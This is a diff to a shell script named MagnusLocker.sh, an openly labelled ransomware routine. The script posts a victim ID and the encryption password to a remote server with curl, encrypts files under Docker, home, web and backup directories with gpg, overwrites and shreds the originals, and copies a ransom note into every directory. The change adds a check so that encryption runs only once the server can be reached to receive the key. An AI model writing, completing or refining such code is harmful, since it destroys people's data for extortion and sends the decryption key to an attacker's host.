MagnusLocker.sh

+++ MagnusLocker.sh
@@ -70,35 +70,41 @@ encrypt_files() {
 
     victim_id=$(date +%s%N | cut -c1-11)
 
-    curl --data "victimid=$victim_id&password=$password" http://server:port/magnus
+    ping -c 1 server > /dev/null
+    if [ $? -eq 0 ]; then
+      curl --data "victimid=$victim_id&password=$password" http://server:port/magnus
 
-    echo "Encryption in progress..."
+      echo "Encryption in progress..."
 
-    target_dir_1="/var/lib/docker"
-    target_dir_2="/home"
-    target_dir_3="/var/www"
-    target_dir_4="/home/backups"
-    target_dir_5="/var/backups"
+      target_dir_1="/var/lib/docker"
+      target_dir_2="/home"
+      target_dir_3="/var/www"
+      target_dir_4="/home/backups"
+      target_dir_5="/var/backups"
 
-    for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 -type f); do
+      for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 -type f); do
         if [ -d "$file" ]; then
             continue
         fi
         echo "$password" | gpg --batch --yes --passphrase-fd 0 --symmetric --cipher-algo AES256 -o "$file.Magnus" "$file" 
-    done
+      done
 
-    for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 -type f); do
+      for file in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 -type f); do
         if [ -f "$file.Magnus" ]; then
             dd if=/dev/urandom of=$file bs=1M count=5
             shred -n 2 -u $file
         fi
-    done
+      done
 
-    echo "Your files have all been encrypted, contact example@protonmail.com for the decryption key! Your unique victim ID: $victim_id" > R34DM3.txt
+      echo "Your files have all been encrypted, contact example@protonmail.com for the decryption key! Your unique victim ID: $victim_id" > R34DM3.txt
 
-    for dir in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 -type d); do
+      for dir in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 -type d); do
         cp R34DM3.txt "$dir/R34DM3.txt"
-    done
+      done
+    else
+      echo "Error: server is not reachable, stopping encryption"
+      exit 1
+    fi
 }
 
 main() {
